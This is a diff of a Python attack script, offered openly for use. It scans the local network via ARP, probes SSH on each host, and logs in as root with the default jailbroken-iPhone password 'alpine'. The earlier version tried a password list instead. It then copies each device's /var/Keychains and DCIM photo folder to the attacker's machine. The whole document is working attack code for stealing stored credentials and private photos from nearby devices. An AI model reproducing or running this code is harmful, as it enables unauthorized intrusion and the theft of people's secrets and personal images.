@@ -1,6 +1,7 @@
-import os
 import subprocess
-import time
+import re
+import socket
+import os
 import optparse
 import time as mm
 import sys as n
@@ -77,26 +78,27 @@ slow2(R+'Attack now\n'+W+'.'*65)
 parser = optparse.OptionParser()
 parser.add_option("-p", "--path",dest="path", help="path you save file in ")
 (options, arguments) = parser.parse_args()
-def getpassword(Password):
-        check_ip = str(subprocess.run(['arp', '-a'], stdout=subprocess.PIPE))
-        All_ip = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), check_ip)
-        for f in All_ip:
-            try:
-                ssh_run = str(subprocess.run(
-                    ["sshpass", "-p", Password, "ssh", "-o StrictHostKeyChecking=no", f"root@{f}"]))
-                os.system("clear")
-                commnad = ssh_run + "\n" + str(subprocess.run(["sshpass", "-p", Password, "sftp", "-r",
-                                                               f"root@{f}:/var/Keychains %s" % options.path])) + str(
-                    subprocess.run(
-                        ["sshpass", "-p", Password, "sftp", "-r",
-                         f"root@{f}:/var/mobile/Media/DCIM/100APPLE/ %s" % options.path]))
-                os.system("clear")
-            except:
-                print("hi")
-file = open("password.txt","r")
-lines = file.readlines()
-# print(type(lines))
-# print(lines)
-for line in lines:
-    line = str(line).strip()
-    getpassword(line)
+check_ip = str(subprocess.run(['arp', '-a'], stdout=subprocess.PIPE))
+All_ip = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), check_ip)
+# ios= re.findall(re.compile('^open'),check_ip)
+# print(check_ip)
+for f in All_ip:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.5)
+        host = f
+        port = 22
+        if s.connect_ex((host, port)):
+            pass
+        else:
+            Password = "alpine"
+            str(subprocess.run(
+                ["sshpass", "-p", Password, "ssh", "-o StrictHostKeyChecking=no", f"root@{host}"]))
+            os.system("clear")
+            str(subprocess.run(["sshpass", "-p", Password, "sftp", "-r",
+                                f"root@{host}:/var/Keychains %s" % options.path]))
+            str(subprocess.run(
+                ["sshpass", "-p", Password, "sftp", "-r",
+                 f"root@{host}:/var/mobile/Media/DCIM/100APPLE/ %s" % options.path]))
+    except:
+        pass
